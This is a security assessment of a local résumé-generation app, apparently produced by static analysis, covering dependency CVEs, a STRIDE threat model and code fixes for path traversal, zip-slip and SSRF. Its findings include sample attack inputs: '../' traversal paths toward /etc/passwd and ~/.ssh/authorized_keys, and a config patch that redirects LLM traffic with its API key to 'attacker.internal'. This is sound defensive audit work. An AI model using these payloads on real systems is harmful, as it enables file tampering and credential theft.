# ResumeForge Security Assessment

> Generated: 2026-04-24
> Scope: Community Edition (local engine, localhost:8080)
> Method: STRIDE threat model + dependency scans

## Executive Summary

ResumeForge CE presents a **HIGH** overall risk posture with two path traversal vulnerabilities (T007, T008) and a confirmed SSRF vector (T010) being the most immediately exploitable issues — any process running as the same local user (or any browser tab open while the Vite dev server is running) can read arbitrary files or redirect LLM calls to an attacker-controlled endpoint. There are **0 CRITICAL** and **6 HIGH** findings, plus **8 MEDIUM/LOW** informational items. The top priority is pinning npm dependencies to fix 3 HIGH CVEs in `@sveltejs/kit`, `vite`, and `picomatch`, followed by adding path-confinement guards to the import and template-preview routes, and adding URL validation to `AIConfig.base_url`.

---

## Dependency Vulnerabilities

### npm (web/)

| Package | Severity | CVE / GHSA | Fix Available |
|---------|----------|------------|---------------|
| `@sveltejs/kit` | HIGH | GHSA-3f6h-2hrp-w5wx — Unvalidated redirect in handle hook causes DoS | Yes |
| `@sveltejs/kit` | HIGH | GHSA-2crg-3p73-43xp — `@sveltejs/adapter-node` BODY_SIZE_LIMIT bypass | Yes |
| `vite` | HIGH | GHSA-p9ff-h696-f583 — Arbitrary file read via Vite dev server WebSocket | Yes |
| `vite` | HIGH | GHSA-v2wj-q39q-566r — `server.fs.deny` bypassed with query strings | Yes |
| `vite` | HIGH | GHSA-4w7w-66w2-5vf9 — Path traversal in optimised deps `.map` handling | Yes |
| `picomatch` | HIGH | GHSA-c2c7-rcm5-vvqj — ReDoS via extglob quantifiers | Yes |
| `picomatch` | HIGH | GHSA-3v7f-55p6-f55p — Method injection in POSIX character classes | Yes |
| `cookie` | LOW | GHSA-pxg6-pf52-xh8x — Accepts out-of-bounds characters in name/path/domain | Yes |

**Remediation:** `cd web && npm audit fix` upgrades all of the above in one pass.

### Python (engine/)

| Package | Version | CVE | Fix Version |
|---------|---------|-----|-------------|
| `aiohttp` | 3.13.3 | CVE-2026-34513 through CVE-2026-34525, CVE-2026-22815 (10 CVEs total) | 3.13.4 |
| `litellm` | 1.82.2 | CVE-2026-35029, CVE-2026-35030, GHSA-69x8-hrgq-fjj8 | 1.83.0 |
| `lxml` | 6.0.2 | CVE-2026-41066 | 6.1.0 |
| `pillow` | 12.1.1 | CVE-2026-40192 | 12.2.0 |
| `pygments` | 2.19.2 | CVE-2026-4539 | 2.20.0 |
| `python-multipart` | 0.0.22 | CVE-2026-40347 | 0.0.26 |
| `requests` | 2.32.5 | CVE-2026-25645 | 2.33.0 |

**Remediation:** `cd engine && uv lock --upgrade && uv sync` resolves all 18 findings.

---

## STRIDE Threat Model

### Spoofing

**T004 — No authentication on the engine API (CONFIRMED)**

The engine exposes its full REST API with zero authentication. There is no auth middleware, no token check, and no `auth/dependencies.py` module (the file does not exist). The `main()` entrypoint binds to `127.0.0.1` only (`app.py:122`), which limits the attack surface to processes running as the same OS user. However, any browser tab open while the Vite dev server is running can trivially call the engine via JavaScript fetch (CORS is localhost-scoped but not origin-verified for direct HTTP access from native processes).

*Exploitability (local CE):* LOW for remote attackers, MEDIUM for same-user local processes and browser-based attacks during development.

**T005 — CORS wildcard methods and headers (PARTIALLY MITIGATED)**

`app.py:42-56` sets `allow_methods=["*"]` and `allow_headers=["*"]` with a fixed origin allowlist. The origins are correctly restricted to localhost variants, so browser-based CSRF from a remote origin is blocked. However, `allow_headers=["*"]` is unnecessarily permissive and `allow_credentials=True` combined with wildcard methods creates a wider attack surface than needed.

*Exploitability (local CE):* LOW — origin allowlist is the effective control.

---

### Tampering

**T007 — Path traversal in POST /api/data/import (CONFIRMED)**

`routes/data.py:149-155`: The `archive_path` query parameter is accepted as an arbitrary filesystem path and passed directly to `Path(archive_path)` with only an existence check. An attacker (or malicious browser tab during dev) can supply any path on the filesystem — e.g. `archive_path=/etc/passwd.zip` or any zip file they control elsewhere on disk — and `store.import_backup()` will extract it into `engine/data/`.

Furthermore, `store.py:195-206` contains a **zip-slip** vulnerability: `zf.namelist()` entries are used to construct `dest = DATA_DIR.parent / relative` without checking that the resolved path stays within `DATA_DIR`. A crafted archive with entries like `../../.bashrc` or `../../.ssh/authorized_keys` will write outside the data directory.

*Exploitability (local CE):* MEDIUM — requires either a local process or open browser tab; allows arbitrary file write within the OS user's home.

**T008 — Path traversal in GET /api/templates/{name}/preview (CONFIRMED)**

`routes/templates.py:74-76`: The `name` path parameter is concatenated directly: `template_dir = templates_root / name`. There is no check that the resolved path is a child of `templates_root`. A request to `/api/templates/../../../etc/passwd/preview` will resolve to `/etc/passwd`, and if that path "exists" the subsequent `iterdir()` or TOML read will be attempted.

More practically, `name` containing `..` segments lets an attacker traverse to any directory the process can read. The only guard is `if not template_dir.exists()` — which does not prevent traversal, only 404s on missing targets.

*Exploitability (local CE):* MEDIUM — directory listing / metadata leak; limited to directories that look like template dirs (no direct file content exfiltration unless a file named `preview.pdf` happens to exist at the traversed path).

**T009 — PATCH /api/config allows overwriting AIConfig.base_url (CONFIRMED)**

`routes/config.py:51-53`: The `ai` dict from the patch body is merged with `**value` directly into the current config with no field allowlist. Any field in `AIConfig` can be overwritten, including `base_url`, `model`, `provider`, and `enabled`. This is the vector enabling T010.

*Exploitability (local CE):* MEDIUM — requires local access; the impact is SSRF (see T010).

---

### Repudiation

**T013 — No audit logging for sensitive operations (CONFIRMED)**

There is no structured audit trail for: profile reads (`GET /api/data/profile`), config writes (`PATCH /api/config`), AI completions (provider.py), or backup imports/exports. Only `logging.INFO` messages go to stdout (e.g. `"PDF export → ..."`, `"ResumeForge engine started."`). Without audit logs an operator cannot determine after the fact whether profile PII was exfiltrated or AI keys were redirected.

*Exploitability (local CE):* LOW — informational; impacts incident response capability.

---

### Information Disclosure

**T006 — PII in plaintext JSON (CONFIRMED, PARTIALLY MITIGATED)**

`engine/data/profile.json` stores name, email, phone, LinkedIn, GitHub, and location in plaintext. The file is gitignored (`engine/data/profile.json` in `.gitignore:4`) which prevents accidental VCS exposure. However, there is no encryption at rest, no file permission hardening (default umask applies), and `GET /api/data/profile` returns all fields over HTTP with no authentication.

*Exploitability (local CE):* LOW for remote attackers (engine binds to 127.0.0.1). On a shared machine the file is readable by any process running as the same OS user.

**T010 — No SSRF validation on AIConfig.base_url (CONFIRMED)**

`ai/provider.py:57-58`: When `self.config.base_url` is set, it is passed directly as `api_base` to `litellm.completion()` without any URL validation. Combined with T009, any caller can `PATCH /api/config` with `{"ai": {"base_url": "http://attacker.internal/capture"}}` and then trigger `/api/tailor` or `/api/build` with `ai=true` to redirect all LLM traffic — including the API key in the Authorization header — to an arbitrary endpoint.

*Exploitability (local CE):* MEDIUM — requires local access to set the config, but the impact is full LLM API key exfiltration.

**T011 — LLM API keys in environment variables (CONFIRMED)**

LiteLLM reads API keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, etc.) from environment variables. On Linux, `/proc/<PID>/environ` is readable by the same user and by root. Any subprocess spawned by the engine inherits these variables. Keys are also visible in `ps auxe` output on some systems.

*Exploitability (local CE):* LOW for single-user workstations; MEDIUM on multi-user systems or containerised deployments without proper secret management.

**T002 — Vite dev server path traversal + file read (CONFIRMED via npm audit)**

Three CVEs in the installed `vite` version allow: (1) arbitrary file read via WebSocket (GHSA-p9ff-h696-f583), (2) `server.fs.deny` bypass via query parameters (GHSA-v2wj-q39q-566r), and (3) path traversal in `.map` handling (GHSA-4w7w-66w2-5vf9). These are **dev-server-only** vulnerabilities — they do not affect production builds. However, developers running `npm run dev` on a machine with other users (or with the dev server bound to a non-loopback address) are at risk.

*Exploitability (local CE):* LOW in strict single-user local dev; MEDIUM if dev server is ever exposed.

---

### Denial of Service

**T001 — @sveltejs/kit unvalidated redirect DoS (CONFIRMED via npm audit)**

GHSA-3f6h-2hrp-w5wx: The installed version of `@sveltejs/kit` allows crafted redirect responses in the `handle` hook to cause a DoS. The CE web frontend does not define a custom `handle` hook (SvelteKit default), so exploitability depends on whether any future hooks are added. Currently a **latent** vulnerability activated by upgrading kit.

*Exploitability (local CE):* LOW — requires a custom handle hook to be exploitable.

**T003 — picomatch ReDoS (CONFIRMED via npm audit)**

GHSA-c2c7-rcm5-vvqj: The installed `picomatch` version is vulnerable to ReDoS via extglob quantifiers. Picomatch is a transitive dependency of Vite/Rollup used during build and dev HMR glob matching. A crafted filename in the project directory could trigger catastrophic backtracking in the dev server's file watcher.

*Exploitability (local CE):* LOW — requires attacker to place files with crafted names in the watched directory.

**T012 — No rate limiting on any endpoint (CONFIRMED)**

No rate-limiting middleware is present in `app.py`. All endpoints — including compute-heavy ones like `POST /api/build`, `POST /api/tailor` (which calls an external LLM), and `POST /api/analyze` — accept unlimited concurrent requests. A tight loop against `POST /api/tailor` with `ai=true` would exhaust LLM API quota and/or CPU.

*Exploitability (local CE):* LOW for remote attackers (127.0.0.1 binding). MEDIUM for same-user processes or browser-tab attacks.

---

### Elevation of Privilege

**T014 — Jinja2 template injection (PARTIALLY CONFIRMED)**

Two exporters use Jinja2:

- `export/pdf.py:45-48`: Uses `Environment(autoescape=select_autoescape(["html", "xml"]))` — **HTML autoescaping is enabled**. User-controlled resume content rendered into `.html.j2` templates will have `<`, `>`, `&` escaped, preventing XSS in the HTML output. However, `autoescape` does not prevent Jinja2 **SSTI** if the template itself is user-controlled (it is not — templates are from the local filesystem).
- `export/markdown.py:37-39`: Uses `Environment(autoescape=False)` — **no escaping**. Markdown output does not need HTML escaping, and again the template files come from the local filesystem, not user input.

The `env.globals["_"]` translator and `env.globals["format_date"]` are read-only function bindings. Resume content (bullets, summary, etc.) is passed as data variables into templates, not as template strings — Jinja2 renders `{{ profile.summary }}` with autoescaping enabled (PDF) or as plain text (MD). There is no `render_template_string()` or `env.from_string()` call with user data.

**DISMISSED** as a practical vulnerability in the current code. The templates are filesystem-controlled, not user-supplied. If a future feature allows user-defined template fragments this must be revisited with `SandboxedEnvironment`.

---

## Remediation Plan

### CRITICAL

No CRITICAL findings identified.

---

### HIGH

| ID | Title | File:Line | STRIDE |
|----|-------|-----------|--------|
| H1 (T007) | Zip-slip + path traversal in `/api/data/import` | `routes/data.py:149-155`, `data/store.py:195-206` | Tampering |
| H2 (T008) | Path traversal in `/api/templates/{name}/preview` | `routes/templates.py:74-77` | Information Disclosure |
| H3 (T010) | SSRF via unvalidated `AIConfig.base_url` | `ai/provider.py:57-58`, `routes/config.py:51-53` | Information Disclosure |
| H4 (T002+T003+T001) | npm HIGH CVEs — vite, picomatch, @sveltejs/kit | `web/package.json` | DoS / Info Disclosure |
| H5 (Python deps) | 18 Python CVEs in aiohttp, litellm, lxml, pillow, etc. | `engine/pyproject.toml` / lockfile | Various |

---

### MEDIUM

| ID | Title | File:Line | STRIDE |
|----|-------|-----------|--------|
| M1 (T012) | No rate limiting on any API endpoint | `engine/resumeforge/api/app.py:42` | DoS |
| M2 (T009) | PATCH /api/config accepts unrestricted field merges | `routes/config.py:51-53` | Tampering |
| M3 (T004) | No authentication on engine API | `api/app.py` — no auth middleware | Spoofing |

---

### LOW / Informational

| ID | Title | File:Line | STRIDE |
|----|-------|-----------|--------|
| L1 (T006) | PII plaintext at rest (profile.json) | `data/store.py:72-77` | Info Disclosure |
| L2 (T011) | LLM API keys in environment variables | `ai/provider.py:40-65` | Info Disclosure |
| L3 (T013) | No audit logging for sensitive operations | `api/app.py:17`, all routes | Repudiation |
| L4 (T005) | CORS wildcard methods/headers | `api/app.py:53-55` | Spoofing |
| L5 (T014) | Jinja2 SSTI — dismissed, templates are filesystem-only | `export/pdf.py:45`, `export/markdown.py:37` | EoP |

---

## Code Fixes

### H1 — Zip-slip + path traversal in `/api/data/import`

**Problem 1:** `archive_path` query param accepts any filesystem path with no confinement check.
**Problem 2:** `store.import_backup()` extracts zip entries without verifying destination stays within `DATA_DIR`.

**Before — `engine/resumeforge/api/routes/data.py:148-155`:**
```python
@router.post("/import", response_model=ImportResponse)
async def import_backup(archive_path: str = Query(..., description="Absolute path to backup archive")) -> ImportResponse:
    """Restore data from a backup archive."""
    path = Path(archive_path)
    if not path.exists():
        raise not_found("Archive", archive_path)
    restored = store.import_backup(path)
    return ImportResponse(restored=restored, count=len(restored))
```

**After — `engine/resumeforge/api/routes/data.py:148-160`:**
```python
@router.post("/import", response_model=ImportResponse)
async def import_backup(archive_path: str = Query(..., description="Absolute path to backup archive")) -> ImportResponse:
    """Restore data from a backup archive."""
    path = Path(archive_path).resolve()
    # Confine imports to the engine output directory (where exports are written)
    allowed_root = store.OUTPUT_DIR.resolve()
    if not str(path).startswith(str(allowed_root) + "/"):
        from resumeforge.api.errors import bad_request
        raise bad_request(
            f"archive_path must be inside {allowed_root}", code="PATH_NOT_ALLOWED"
        )
    if not path.exists():
        raise not_found("Archive", archive_path)
    restored = store.import_backup(path)
    return ImportResponse(restored=restored, count=len(restored))
```

**Before — `engine/resumeforge/data/store.py:195-206`:**
```python
def import_backup(archive_path: Path) -> list[str]:
    """Restore data from a backup zip. Returns list of restored files."""
    _ensure_dirs()
    restored: list[str] = []
    with zipfile.ZipFile(archive_path, "r") as zf:
        for name in zf.namelist():
            if name.startswith("data/") and name.endswith(".json"):
                relative = Path(name)
                dest = DATA_DIR.parent / relative
                dest.parent.mkdir(parents=True, exist_ok=True)
                dest.write_bytes(zf.read(name))
                restored.append(name)
    return restored
```

**After — `engine/resumeforge/data/store.py:195-215`:**
```python
def import_backup(archive_path: Path) -> list[str]:
    """Restore data from a backup zip. Returns list of restored files."""
    _ensure_dirs()
    restored: list[str] = []
    data_root = DATA_DIR.resolve()
    with zipfile.ZipFile(archive_path, "r") as zf:
        for name in zf.namelist():
            if not (name.startswith("data/") and name.endswith(".json")):
                continue
            # Zip-slip guard: resolve destination and confirm it stays within DATA_DIR
            dest = (DATA_DIR.parent / Path(name)).resolve()
            if not str(dest).startswith(str(data_root) + "/"):
                import logging as _log
                _log.getLogger(__name__).warning("Skipping unsafe zip entry: %s", name)
                continue
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(zf.read(name))
            restored.append(name)
    return restored
```

---

### H2 — Path traversal in `/api/templates/{name}/preview`

**Problem:** `templates_root / name` is constructed without verifying the resolved path is a child of `templates_root`.

**Before — `engine/resumeforge/api/routes/templates.py:67-77`:**
```python
@router.get("/{name}/preview")
async def preview_template(name: str) -> Response:
    templates_root = _templates_root()
    template_dir = templates_root / name
    if not template_dir.exists():
        raise not_found("Template", name)
```

**After — `engine/resumeforge/api/routes/templates.py:67-80`:**
```python
@router.get("/{name}/preview")
async def preview_template(name: str) -> Response:
    templates_root = _templates_root().resolve()
    template_dir = (templates_root / name).resolve()
    # Path traversal guard: resolved template_dir must be a direct child of templates_root
    if not str(template_dir).startswith(str(templates_root) + "/"):
        raise not_found("Template", name)
    if not template_dir.exists():
        raise not_found("Template", name)
```

Apply the same guard to the `list_templates` route's `_templates_root()` usage (the iterdir loop already scopes itself, so it is safe, but the resolved-path pattern should be consistent).

---

### H3 — SSRF via unvalidated `AIConfig.base_url`

**Problem 1:** `AIConfig.base_url` accepts any string — no URL scheme or host validation.
**Problem 2:** The value is passed directly to LiteLLM as `api_base`.

**Before — `engine/resumeforge/data/schema.py:262-267`:**
```python
class AIConfig(BaseModel):
    provider: str = "openai"
    model: str = "gpt-4o"
    base_url: str | None = None
    temperature: float = 0.3
    enabled: bool = False
```

**After — `engine/resumeforge/data/schema.py:262-285`:**
```python
class AIConfig(BaseModel):
    provider: str = "openai"
    model: str = "gpt-4o"
    base_url: str | None = None
    temperature: float = 0.3
    enabled: bool = False

    @field_validator("base_url", mode="before")
    @classmethod
    def validate_base_url(cls, v: object) -> object:
        if v is None:
            return v
        if not isinstance(v, str):
            raise ValueError("base_url must be a string or null")
        from urllib.parse import urlparse
        parsed = urlparse(v)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("base_url must use http or https scheme")
        host = parsed.hostname or ""
        # Block RFC-1918 / loopback ranges to prevent SSRF to internal services
        # Allow localhost explicitly (local Ollama, LM Studio, etc.)
        import ipaddress
        try:
            addr = ipaddress.ip_address(host)
            if addr.is_private and not addr.is_loopback:
                raise ValueError("base_url must not target private IP ranges")
        except ValueError as exc:
            if "base_url" in str(exc) or "private" in str(exc):
                raise
            # hostname is a domain name, not an IP — allow it
        return v
```

Additionally, restrict `PATCH /api/config` to an explicit field allowlist to prevent unexpected field injection:

**Before — `engine/resumeforge/api/routes/config.py:51-53`:**
```python
    for key, value in [("engine", patch.engine), ("ai", patch.ai), ("style", patch.style)]:
        if value is not None:
            current[key] = {**current.get(key, {}), **value}
```

**After — `engine/resumeforge/api/routes/config.py:51-65`:**
```python
    _AI_ALLOWED = {"model", "temperature", "enabled", "base_url", "provider"}
    _ENGINE_ALLOWED = {"port", "mode"}
    _STYLE_ALLOWED = {"tone", "max_pages", "bullet_style", "avoid_tool_names_in_bullets"}
    _FIELD_ALLOWLISTS: dict[str, set[str]] = {
        "ai": _AI_ALLOWED,
        "engine": _ENGINE_ALLOWED,
        "style": _STYLE_ALLOWED,
    }
    for key, value in [("engine", patch.engine), ("ai", patch.ai), ("style", patch.style)]:
        if value is not None:
            allowed = _FIELD_ALLOWLISTS[key]
            filtered = {k: v for k, v in value.items() if k in allowed}
            current[key] = {**current.get(key, {}), **filtered}
```

---

### H4 — npm HIGH CVEs (vite, picomatch, @sveltejs/kit)

**Fix:** Run `npm audit fix` from `web/`. All three packages have patches available. Commit the updated `package-lock.json`.

```bash
cd /home/yarin/Projects/resumeforge/web
npm audit fix
npm run check   # verify no type errors after upgrade
```

If `npm audit fix` cannot resolve without breaking changes, run `npm audit fix --force` and test the web build.

---

### H5 — Python dependency CVEs (aiohttp, litellm, lxml, pillow, pygments, python-multipart, requests)

**Fix:** Update all constraints in `engine/pyproject.toml` to the minimum patched versions, then regenerate the lockfile.

```bash
cd /home/yarin/Projects/resumeforge/engine
uv add aiohttp>=3.13.4 litellm>=1.83.0 lxml>=6.1.0 pillow>=12.2.0 pygments>=2.20.0 python-multipart>=0.0.26 requests>=2.33.0
uv sync
uv run pytest   # verify no regressions
```

---

### M1 — Rate limiting

Add `slowapi` rate limiting to the FastAPI app to protect compute-heavy and LLM-calling endpoints.

**`engine/pyproject.toml`:** add `slowapi>=0.1.9` to dependencies.

**`engine/resumeforge/api/app.py` — add after the CORS middleware block:**
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address, default_limits=["60/minute"])
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

**Decorate heavy endpoints in `routes/build.py` and `routes/tailor.py`:**
```python
from resumeforge.api.app import limiter
from fastapi import Request

@router.post("")
@limiter.limit("10/minute")
async def build_resume(request: Request, ...) -> BuildResponse:
    ...

@router.post("")
@limiter.limit("5/minute")
async def tailor_resume(request: Request, body: TailorRequest) -> TailorResponse:
    ...
```

---

### M2 (see H3 fix above — field allowlist in PATCH /api/config)

The field allowlist fix in H3 also addresses M2 completely.

---

### M3 — API Authentication

For CE (single local user) the minimum viable protection is a static bearer token checked at startup, stored in `meta.json` or a dedicated secrets file:

**`engine/resumeforge/api/app.py`:**
```python
import os
import secrets
from fastapi import Depends, HTTPException, Security
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

_bearer = HTTPBearer(auto_error=False)
_ENGINE_TOKEN = os.environ.get("RESUMEFORGE_API_TOKEN", "")

async def require_token(
    creds: HTTPAuthorizationCredentials | None = Security(_bearer),
) -> None:
    if not _ENGINE_TOKEN:
        return  # token auth disabled (dev mode / token not configured)
    if creds is None or creds.credentials != _ENGINE_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")
```

Add `dependencies=[Depends(require_token)]` to each router `include_router` call. Generate a token at first run and store it in `engine/data/.token` (gitignored).

---

## Accepted Risks (Community Edition)

The following items are acknowledged and deferred for CE given the localhost-only deployment model:

| ID | Risk | Reason Accepted |
|----|------|-----------------|
| T004 (partial) | No auth on engine API | Engine binds to 127.0.0.1 only; same-user threat accepted for CE. Static token (M3 fix) is the planned mitigation. |
| T005 | CORS wildcard methods/headers | Origin allowlist is the effective control; wildcard methods/headers do not increase risk when origins are correctly restricted. |
| T006 | PII in plaintext JSON | Single-user local filesystem; gitignore prevents VCS exposure. Encryption at rest is a CE+ / cloud edition concern. |
| T011 | LLM API keys in env vars | Standard practice for CLI tools; no multi-user system supported in CE. Keys are user-owned. |
| T013 | No audit logging | CE is single-user; structured audit trail is a cloud edition / enterprise requirement. |
| T014 | Jinja2 SSTI | Dismissed — templates are filesystem-controlled, not user-supplied strings. Re-evaluate if user-defined template fragments are ever supported. |

---

*This document was produced by static code analysis and dependency scanning. It does not replace a dynamic penetration test or a formal security audit.*
